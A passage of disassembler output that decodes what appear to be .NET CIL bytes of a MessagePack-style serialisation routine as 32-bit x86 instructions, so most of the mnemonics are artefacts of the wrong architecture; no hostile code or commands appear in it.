  4051c4:	00 18                	add    %bl,(%eax)
  4051c6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051ca:	01 0b                	add    %ecx,(%ebx)
  4051cc:	03 07                	add    (%edi),%eax
  4051ce:	16                   	push   %ss
  4051cf:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	0a 26                	or     (%esi),%ah
  4051d6:	07                   	pop    %es
  4051d7:	28 58 00             	sub    %bl,0x0(%eax)
  4051da:	00 06                	add    %al,(%esi)
  4051dc:	0b 07                	or     (%edi),%eax
  4051de:	16                   	push   %ss
  4051df:	28 07                	sub    %al,(%edi)
  4051e1:	01 00                	add    %eax,(%eax)
  4051e3:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051e6:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051e9:	00 06                	add    %al,(%esi)
  4051eb:	02 18                	add    (%eax),%bl
  4051ed:	7d 36                	jge    0x405225
  4051ef:	00 00                	add    %al,(%eax)
  4051f1:	04 16                	add    $0x16,%al
  4051f3:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051f8:	00 02                	add    %al,(%edx)
  4051fa:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051fe:	06                   	push   %es
  4051ff:	25 03 28 96 00       	and    $0x962803,%eax
  405204:	00 06                	add    %al,(%esi)
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6a 00                	push   $0x0
  405209:	00 06                	add    %al,(%esi)
  40520b:	03 6f 88             	add    -0x78(%edi),%ebp
  40520e:	00 00                	add    %al,(%eax)
  405210:	06                   	push   %es
  405211:	09 17                	or     %edx,(%edi)
  405213:	58                   	pop    %eax
  405214:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405219:	2a 06                	sub    (%esi),%al
  40521b:	20 df                	and    %bl,%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	00 40 55             	add    %al,0x55(%eax)
  405222:	00 00                	add    %al,(%eax)
  405224:	00 1a                	add    %bl,(%edx)
  405226:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40522a:	01 0b                	add    %ecx,(%ebx)
  40522c:	03 07                	add    (%edi),%eax
  40522e:	16                   	push   %ss
  40522f:	1a 6f 45             	sbb    0x45(%edi),%ch
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 26                	or     (%esi),%ah
  405236:	07                   	pop    %es
  405237:	28 58 00             	sub    %bl,0x0(%eax)
  40523a:	00 06                	add    %al,(%esi)
  40523c:	0b 07                	or     (%edi),%eax
  40523e:	16                   	push   %ss
  40523f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405243:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405246:	28 6b 00             	sub    %ch,0x0(%ebx)
  405249:	00 06                	add    %al,(%esi)
  40524b:	02 18                	add    (%eax),%bl
  40524d:	7d 36                	jge    0x405285
  40524f:	00 00                	add    %al,(%eax)
  405251:	04 16                	add    $0x16,%al
  405253:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405258:	00 02                	add    %al,(%edx)
  40525a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40525e:	06                   	push   %es
  40525f:	25 03 28 96 00       	and    $0x962803,%eax
  405264:	00 06                	add    %al,(%esi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	6a 00                	push   $0x0
  405269:	00 06                	add    %al,(%esi)
  40526b:	03 6f 88             	add    -0x78(%edi),%ebp
  40526e:	00 00                	add    %al,(%eax)
  405270:	06                   	push   %es
  405271:	09 17                	or     %edx,(%edi)
  405273:	58                   	pop    %eax
  405274:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405279:	2a 06                	sub    (%esi),%al
  40527b:	20 da                	and    %bl,%dl
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 40 0e             	add    %al,0xe(%eax)
  405282:	00 00                	add    %al,(%eax)
  405284:	00 02                	add    %al,(%edx)
  405286:	06                   	push   %es
  405287:	03 28                	add    (%eax),%ebp
  405289:	97                   	xchg   %eax,%edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	06                   	push   %es
  40528d:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405293:	06                   	push   %es
  405294:	20 db                	and    %bl,%bl
  405296:	00 00                	add    %al,(%eax)
  405298:	00 40 0e             	add    %al,0xe(%eax)
  40529b:	00 00                	add    %al,(%eax)
  40529d:	00 02                	add    %al,(%edx)
  40529f:	06                   	push   %es
  4052a0:	03 28                	add    (%eax),%ebp
  4052a2:	97                   	xchg   %eax,%edi
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	06                   	push   %es
  4052a6:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052ac:	06                   	push   %es
  4052ad:	20 d0                	and    %dl,%al
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	00 40 0f             	add    %al,0xf(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 02                	add    %al,(%edx)
  4052b8:	03 6f 00             	add    0x0(%edi),%ebp
  4052bb:	01 00                	add    %eax,(%eax)
  4052bd:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c0:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052c4:	06                   	push   %es
  4052c5:	2a 06                	sub    (%esi),%al
  4052c7:	20 d1                	and    %dl,%cl
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 40 27             	add    %al,0x27(%eax)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	00 18                	add    %bl,(%eax)
  4052d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052d6:	01 0b                	add    %ecx,(%ebx)
  4052d8:	03 07                	add    (%edi),%eax
  4052da:	16                   	push   %ss
  4052db:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	0a 26                	or     (%esi),%ah
  4052e2:	07                   	pop    %es
  4052e3:	28 58 00             	sub    %bl,0x0(%eax)
  4052e6:	00 06                	add    %al,(%esi)
  4052e8:	0b 02                	or     (%edx),%eax
  4052ea:	07                   	pop    %es
  4052eb:	16                   	push   %ss
  4052ec:	28 07                	sub    %al,(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 6a 28             	or     0x28(%edx),%ch
  4052f3:	74 00                	je     0x4052f5
  4052f5:	00 06                	add    %al,(%esi)
  4052f7:	2a 06                	sub    (%esi),%al
  4052f9:	20 d2                	and    %dl,%dl
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	00 40 27             	add    %al,0x27(%eax)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 1a                	add    %bl,(%edx)
  405304:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405308:	01 0b                	add    %ecx,(%ebx)
  40530a:	03 07                	add    (%edi),%eax
  40530c:	16                   	push   %ss
  40530d:	1a 6f 45             	sbb    0x45(%edi),%ch
  405310:	00 00                	add    %al,(%eax)
  405312:	0a 26                	or     (%esi),%ah
  405314:	07                   	pop    %es
  405315:	28 58 00             	sub    %bl,0x0(%eax)
  405318:	00 06                	add    %al,(%esi)
  40531a:	0b 02                	or     (%edx),%eax
  40531c:	07                   	pop    %es
  40531d:	16                   	push   %ss
  40531e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405322:	0a 6a 28             	or     0x28(%edx),%ch
  405325:	74 00                	je     0x405327
  405327:	00 06                	add    %al,(%esi)
  405329:	2a 06                	sub    (%esi),%al
  40532b:	20 d3                	and    %dl,%bl
  40532d:	00 00                	add    %al,(%eax)
  40532f:	00 40 25             	add    %al,0x25(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	00 1e                	add    %bl,(%esi)
  405336:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40533a:	01 0b                	add    %ecx,(%ebx)
  40533c:	03 07                	add    (%edi),%eax
  40533e:	16                   	push   %ss
  40533f:	1e                   	push   %ds
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	45                   	inc    %ebp
  405342:	00 00                	add    %al,(%eax)
  405344:	0a 26                	or     (%esi),%ah
  405346:	07                   	pop    %es
  405347:	28 58 00             	sub    %bl,0x0(%eax)
  40534a:	00 06                	add    %al,(%esi)
  40534c:	0b 02                	or     (%edx),%eax
  40534e:	07                   	pop    %es
  40534f:	16                   	push   %ss
  405350:	28 08                	sub    %cl,(%eax)
  405352:	01 00                	add    %eax,(%eax)
  405354:	0a 28                	or     (%eax),%ch
  405356:	74 00                	je     0x405358
  405358:	00 06                	add    %al,(%esi)
  40535a:	2a 00                	sub    (%eax),%al
  40535c:	1b 30                	sbb    (%eax),%esi
  40535e:	04 00                	add    $0x0,%al
  405360:	4d                   	dec    %ebp
  405361:	00 00                	add    %al,(%eax)
  405363:	00 27                	add    %ah,(%edi)
  405365:	00 00                	add    %al,(%eax)
  405367:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40536a:	00 00                	add    %al,(%eax)
  40536c:	0a 0a                	or     (%edx),%cl
  40536e:	02 06                	add    (%esi),%al
  405370:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  405376:	6f                   	outsl  %ds:(%esi),(%dx)
  405377:	e2 00                	loop   0x405379
  405379:	00 0a                	add    %cl,(%edx)
  40537b:	d4 8d                	aam    $0x8d
  40537d:	44                   	inc    %esp
  40537e:	00 00                	add    %al,(%eax)
  405380:	01 0b                	add    %ecx,(%ebx)
  405382:	06                   	push   %es
  405383:	16                   	push   %ss
  405384:	6a 6f                	push   $0x6f
  405386:	4e                   	dec    %esi
  405387:	00 00                	add    %al,(%eax)
  405389:	0a 06                	or     (%esi),%al
  40538b:	07                   	pop    %es
  40538c:	16                   	push   %ss
  40538d:	06                   	push   %es
  40538e:	6f                   	outsl  %ds:(%esi),(%dx)
  40538f:	e2 00                	loop   0x405391
  405391:	00 0a                	add    %cl,(%edx)
  405393:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40539a:	07                   	pop    %es
  40539b:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a1:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053a7:	39 06                	cmp    %eax,(%esi)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 06                	add    %al,(%esi)
  4053ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ae:	33 00                	xor    (%eax),%eax
  4053b0:	00 0a                	add    %cl,(%edx)
  4053b2:	dc 08                	fmull  (%eax)
  4053b4:	2a 00                	sub    (%eax),%al
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	01 10                	add    %edx,(%eax)
  4053ba:	00 00                	add    %al,(%eax)
  4053bc:	02 00                	add    (%eax),%al
  4053be:	06                   	push   %es
  4053bf:	00 38                	add    %bh,(%eax)
  4053c1:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053c8:	13 30                	adc    (%eax),%esi
  4053ca:	02 00                	add    (%eax),%al
  4053cc:	ec                   	in     (%dx),%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	00 20                	add    %ah,(%eax)
  4053d1:	00 00                	add    %al,(%eax)
  4053d3:	11 02                	adc    %eax,(%edx)
  4053d5:	7b 36                	jnp    0x40540d
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 0a                	add    $0xa,%al
  4053db:	06                   	push   %es
  4053dc:	45                   	inc    %ebp
  4053dd:	0c 00                	or     $0x0,%al
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	05 00 00 00 05       	add    $0x5000000,%eax
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	1e                   	push   %ds
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 30                	add    %dh,(%eax)
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	00 42 00             	add    %al,0x0(%edx)
  4053ff:	00 00                	add    %al,(%eax)
  405401:	54                   	push   %esp
  405402:	00 00                	add    %al,(%eax)
  405404:	00 66 00             	add    %ah,0x0(%esi)
  405407:	00 00                	add    %al,(%eax)
  405409:	79 00                	jns    0x40540b
  40540b:	00 00                	add    %al,(%eax)
  40540d:	86 00                	xchg   %al,(%eax)
  40540f:	00 00                	add    %al,(%eax)
  405411:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  405417:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  40541d:	03 02                	add    (%edx),%eax
  40541f:	7b 35                	jnp    0x405456
  405421:	00 00                	add    %al,(%eax)
  405423:	04 74                	add    $0x74,%al
  405425:	38 00                	cmp    %al,(%eax)
  405427:	00 01                	add    %al,(%ecx)
  405429:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  40542f:	03 02                	add    (%edx),%eax
  405431:	7b 35                	jnp    0x405468
  405433:	00 00                	add    %al,(%eax)
  405435:	04 a5                	add    $0xa5,%al
  405437:	68 00 00 01 28       	push   $0x28010000
  40543c:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405441:	03 02                	add    (%edx),%eax
  405443:	7b 35                	jnp    0x40547a
  405445:	00 00                	add    %al,(%eax)
  405447:	04 a5                	add    $0xa5,%al
  405449:	95                   	xchg   %eax,%ebp
  40544a:	00 00                	add    %al,(%eax)
  40544c:	01 28                	add    %ebp,(%eax)
  40544e:	9f                   	lahf
  40544f:	00 00                	add    %al,(%eax)
  405451:	06                   	push   %es
  405452:	2a 03                	sub    (%ebx),%al
  405454:	02 7b 35             	add    0x35(%ebx),%bh
  405457:	00 00                	add    %al,(%eax)
  405459:	04 a5                	add    $0xa5,%al
  40545b:	6c                   	insb   (%dx),%es:(%edi)
  40545c:	00 00                	add    %al,(%eax)
  40545e:	01 28                	add    %ebp,(%eax)
  405460:	9e                   	sahf
  405461:	00 00                	add    %al,(%eax)
  405463:	06                   	push   %es
  405464:	2a 03                	sub    (%ebx),%al
  405466:	02 7b 35             	add    0x35(%ebx),%bh
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 a5                	add    $0xa5,%al
  40546d:	96                   	xchg   %eax,%esi
  40546e:	00 00                	add    %al,(%eax)
  405470:	01 28                	add    %ebp,(%eax)
  405472:	9c                   	pushf
  405473:	00 00                	add    %al,(%eax)
  405475:	06                   	push   %es
  405476:	2a 03                	sub    (%ebx),%al
  405478:	02 7b 35             	add    0x35(%ebx),%bh
  40547b:	00 00                	add    %al,(%eax)
  40547d:	04 a5                	add    $0xa5,%al
  40547f:	97                   	xchg   %eax,%edi
  405480:	00 00                	add    %al,(%eax)
  405482:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  405486:	00 00                	add    %al,(%eax)
  405488:	06                   	push   %es
  405489:	2a 03                	sub    (%ebx),%al
  40548b:	02 28                	add    (%eax),%ch
  40548d:	77 00                	ja     0x40548f
  40548f:	00 06                	add    %al,(%esi)
  405491:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  405497:	03 02                	add    (%edx),%eax
  405499:	7b 35                	jnp    0x4054d0
  40549b:	00 00                	add    %al,(%eax)
  40549d:	04 74                	add    $0x74,%al
  40549f:	02 00                	add    (%eax),%al
  4054a1:	00 1b                	add    %bl,(%ebx)
  4054a3:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054a9:	02 03                	add    (%ebx),%al
  4054ab:	28 72 00             	sub    %dh,0x0(%edx)
  4054ae:	00 06                	add    %al,(%esi)
  4054b0:	2a 02                	sub    (%edx),%al
  4054b2:	03 28                	add    (%eax),%ebp
  4054b4:	73 00                	jae    0x4054b6
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 03                	sub    (%ebx),%al
  4054ba:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c0:	1b 30                	sbb    (%eax),%esi
  4054c2:	03 00                	add    (%eax),%eax
  4054c4:	42                   	inc    %edx
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 28                	add    %ch,(%eax)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	11 02                	adc    %eax,(%edx)
  4054cd:	0a 16                	or     (%esi),%dl
  4054cf:	0b 06                	or     (%esi),%eax
  4054d1:	12 01                	adc    (%ecx),%al
  4054d3:	28 49 00             	sub    %cl,0x0(%ecx)
  4054d6:	00 0a                	add    %cl,(%edx)
  4054d8:	02 7b 39             	add    0x39(%ebx),%bh
  4054db:	00 00                	add    %al,(%eax)
  4054dd:	04 3a                	add    $0x3a,%al
  4054df:	12 00                	adc    (%eax),%al
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	02 02                	add    (%edx),%al
  4054e5:	02 7b 38             	add    0x38(%ebx),%bh
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	04 73                	add    $0x73,%al
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	00 06                	add    %al,(%esi)
  4054f0:	7d 39                	jge    0x40552b
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	04 dd                	add    $0xdd,%al
  4054f6:	0d 00 00 00 07       	or     $0x7000000,%eax
  4054fb:	39 06                	cmp    %eax,(%esi)
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 06                	add    %al,(%esi)
  405501:	28 50 00             	sub    %dl,0x0(%eax)
  405504:	00 0a                	add    %cl,(%edx)
  405506:	dc 02                	faddl  (%edx)
  405508:	7b 39                	jnp    0x405543
  40550a:	00 00                	add    %al,(%eax)
  40550c:	04 2a                	add    $0x2a,%al
  40550e:	00 00                	add    %al,(%eax)
  405510:	01 10                	add    %edx,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	02 00                	add    (%eax),%al
  405516:	04 00                	add    $0x0,%al
  405518:	2a 2e                	sub    (%esi),%ch
  40551a:	00 0d 00 00 00 00    	add    %cl,0x0
  405520:	13 30                	adc    (%eax),%esi
  405522:	04 00                	add    $0x0,%al
  405524:	18 00                	sbb    %al,(%eax)
  405526:	00 00                	add    %al,(%eax)
  405528:	29 00                	sub    %eax,(%eax)
  40552a:	00 11                	add    %dl,(%ecx)
  40552c:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  405532:	0a 02                	or     (%edx),%al
  405534:	06                   	push   %es
  405535:	16                   	push   %ss
  405536:	03 6f 45             	add    0x45(%edi),%ebp
  405539:	00 00                	add    %al,(%eax)
  40553b:	0a 26                	or     (%esi),%ah
  40553d:	06                   	push   %es
  40553e:	28 55 00             	sub    %dl,0x0(%ebp)
  405541:	00 06                	add    %al,(%esi)
  405543:	2a 13                	sub    (%ebx),%dl
  405545:	30 04 00             	xor    %al,(%eax,%eax,1)
  405548:	b1 00                	mov    $0x0,%cl
  40554a:	00 00                	add    %al,(%eax)
  40554c:	2a 00                	sub    (%eax),%al
  40554e:	00 11                	add    %dl,(%ecx)
  405550:	14 0a                	adc    $0xa,%al
  405552:	16                   	push   %ss
  405553:	0b 02                	or     (%edx),%eax
  405555:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  40555b:	18 00                	sbb    %al,(%eax)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	02 20                	add    (%eax),%ah
  405561:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  405566:	0d 00 00 00 02       	or     $0x2000000,%eax
  40556b:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405571:	0b 38                	or     (%eax),%edi
  405573:	72 00                	jb     0x405575
  405575:	00 00                	add    %al,(%eax)
  405577:	02 20                	add    (%eax),%ah
  405579:	d9 00                	flds   (%eax)
  40557b:	00 00                	add    %al,(%eax)
  40557d:	40                   	inc    %eax
  40557e:	0c 00                	or     $0x0,%al
  405580:	00 00                	add    %al,(%eax)
  405582:	03 6f 00             	add    0x0(%edi),%ebp
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 0b                	or     (%ebx),%cl
  405589:	38 5b 00             	cmp    %bl,0x0(%ebx)
  40558c:	00 00                	add    %al,(%eax)
  40558e:	02 20                	add    (%eax),%ah
  405590:	da 00                	fiaddl (%eax)
  405592:	00 00                	add    %al,(%eax)
  405594:	40                   	inc    %eax
  405595:	25 00 00 00 18       	and    $0x18000000,%eax
  40559a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40559e:	01 0a                	add    %ecx,(%edx)
  4055a0:	03 06                	add    (%esi),%eax
  4055a2:	16                   	push   %ss
  4055a3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a 26                	or     (%esi),%ah
  4055aa:	06                   	push   %es
  4055ab:	28 58 00             	sub    %bl,0x0(%eax)
  4055ae:	00 06                	add    %al,(%esi)
  4055b0:	0a 06                	or     (%esi),%al
  4055b2:	16                   	push   %ss
  4055b3:	28 02                	sub    %al,(%edx)
  4055b5:	01 00                	add    %eax,(%eax)
  4055b7:	0a 0b                	or     (%ebx),%cl
  4055b9:	38 2b                	cmp    %ch,(%ebx)
  4055bb:	00 00                	add    %al,(%eax)
  4055bd:	00 02                	add    %al,(%edx)
  4055bf:	20 db                	and    %bl,%bl
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 40 20             	add    %al,0x20(%eax)
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	00 1a                	add    %bl,(%edx)
  4055ca:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ce:	01 0a                	add    %ecx,(%edx)
  4055d0:	03 06                	add    (%esi),%eax
  4055d2:	16                   	push   %ss
  4055d3:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	0a 26                	or     (%esi),%ah
  4055da:	06                   	push   %es
  4055db:	28 58 00             	sub    %bl,0x0(%eax)
  4055de:	00 06                	add    %al,(%esi)
  4055e0:	0a 06                	or     (%esi),%al
  4055e2:	16                   	push   %ss
  4055e3:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055e7:	0a 0b                	or     (%ebx),%cl
  4055e9:	07                   	pop    %es
  4055ea:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ee:	01 0a                	add    %ecx,(%edx)
  4055f0:	03 06                	add    (%esi),%eax
  4055f2:	16                   	push   %ss
  4055f3:	07                   	pop    %es
  4055f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f5:	45                   	inc    %ebp
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	0a 26                	or     (%esi),%ah
  4055fa:	06                   	push   %es
  4055fb:	28 55 00             	sub    %dl,0x0(%ebp)
  4055fe:	00 06                	add    %al,(%esi)
  405600:	2a 00                	sub    (%eax),%al
  405602:	00 00                	add    %al,(%eax)
  405604:	13 30                	adc    (%eax),%esi
  405606:	04 00                	add    $0x0,%al
  405608:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  40560d:	00 00                	add    %al,(%eax)
  40560f:	11 03                	adc    %eax,(%ebx)
  405611:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  405615:	06                   	push   %es
  405616:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405619:	06                   	push   %es
  40561a:	8e 69 0c             	mov    0xc(%ecx),%gs
  40561d:	16                   	push   %ss
  40561e:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  405623:	16                   	push   %ss
  405624:	00 00                	add    %al,(%eax)
  405626:	00 20                	add    %ah,(%eax)
  405628:	a0 00 00 00 08       	mov    0x8000000,%al
  40562d:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405630:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  405635:	00 00                	add    %al,(%eax)
  405637:	0a 38                	or     (%eax),%bh
  405639:	80 00 00             	addb   $0x0,(%eax)
  40563c:	00 08                	add    %cl,(%eax)
  40563e:	20 ff                	and    %bh,%bh
  405640:	00 00                	add    %al,(%eax)
  405642:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405648:	20 d9                	and    %bl,%cl
  40564a:	00 00                	add    %al,(%eax)
  40564c:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405652:	00 00                	add    %al,(%eax)
  405654:	0a 08                	or     (%eax),%cl
  405656:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 38                	or     (%eax),%bh
  405660:	59                   	pop    %ecx
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	20 ff                	and    %bh,%bh
  405667:	ff 00                	incl   (%eax)
  405669:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40566f:	20 da                	and    %bl,%dl
  405671:	00 00                	add    %al,(%eax)
  405673:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405679:	00 00                	add    %al,(%eax)
  40567b:	0a 08                	or     (%eax),%cl
  40567d:	68 28 ef 00 00       	push   $0xef28
  405682:	0a 28                	or     (%eax),%ch
  405684:	58                   	pop    %eax
  405685:	00 00                	add    %al,(%eax)
  405687:	06                   	push   %es
  405688:	0b 02                	or     (%edx),%eax
  40568a:	07                   	pop    %es
  40568b:	16                   	push   %ss
  40568c:	07                   	pop    %es
  40568d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405690:	4c                   	dec    %esp
  405691:	00 00                	add    %al,(%eax)
  405693:	0a 38                	or     (%eax),%bh
  405695:	24 00                	and    $0x0,%al
  405697:	00 00                	add    %al,(%eax)
  405699:	20 db                	and    %bl,%bl
  40569b:	00 00                	add    %al,(%eax)
  40569d:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	0a 08                	or     (%eax),%cl
  4056a7:	28 4a 00             	sub    %cl,0x0(%edx)
  4056aa:	00 0a                	add    %cl,(%edx)
  4056ac:	28 58 00             	sub    %bl,0x0(%eax)
  4056af:	00 06                	add    %al,(%esi)
  4056b1:	0b 02                	or     (%edx),%eax
  4056b3:	07                   	pop    %es
  4056b4:	16                   	push   %ss
  4056b5:	07                   	pop    %es
  4056b6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056b9:	4c                   	dec    %esp
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	0a 02                	or     (%edx),%al
  4056be:	06                   	push   %es
  4056bf:	16                   	push   %ss
  4056c0:	06                   	push   %es
  4056c1:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c4:	4c                   	dec    %esp
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 2a                	or     (%edx),%ch
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	00 13                	add    %dl,(%ebx)
  4056cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d0:	94                   	xchg   %eax,%esp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056d6:	00 11                	add    %dl,(%ecx)
  4056d8:	14 0a                	adc    $0xa,%al
  4056da:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e0:	07                   	pop    %es
  4056e1:	20 ff                	and    %bh,%bh
  4056e3:	00 00                	add    %al,(%eax)
  4056e5:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056eb:	20 c4                	and    %al,%ah
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056f2:	08 6f ee             	or     %ch,-0x12(%edi)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	0a 07                	or     (%edi),%al
  4056f9:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  4056fc:	08 6f ee             	or     %ch,-0x12(%edi)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	0a 38                	or     (%eax),%bh
  405703:	59                   	pop    %ecx
  405704:	00 00                	add    %al,(%eax)
  405706:	00 07                	add    %al,(%edi)
  405708:	20 ff                	and    %bh,%bh
  40570a:	ff 00                	incl   (%eax)
  40570c:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405712:	20 c5                	and    %al,%ch
  405714:	00 00                	add    %al,(%eax)
  405716:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405719:	08 6f ee             	or     %ch,-0x12(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	0a 07                	or     (%edi),%al
  405720:	68 28 ef 00 00       	push   $0xef28
  405725:	0a 28                	or     (%eax),%ch
  405727:	58                   	pop    %eax
  405728:	00 00                	add    %al,(%eax)
  40572a:	06                   	push   %es
  40572b:	0a 02                	or     (%edx),%al
  40572d:	06                   	push   %es
  40572e:	16                   	push   %ss
  40572f:	06                   	push   %es
  405730:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405733:	4c                   	dec    %esp
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 38                	or     (%eax),%bh
  405738:	24 00                	and    $0x0,%al
  40573a:	00 00                	add    %al,(%eax)
  40573c:	20 c6                	and    %al,%dh
  40573e:	00 00                	add    %al,(%eax)
  405740:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
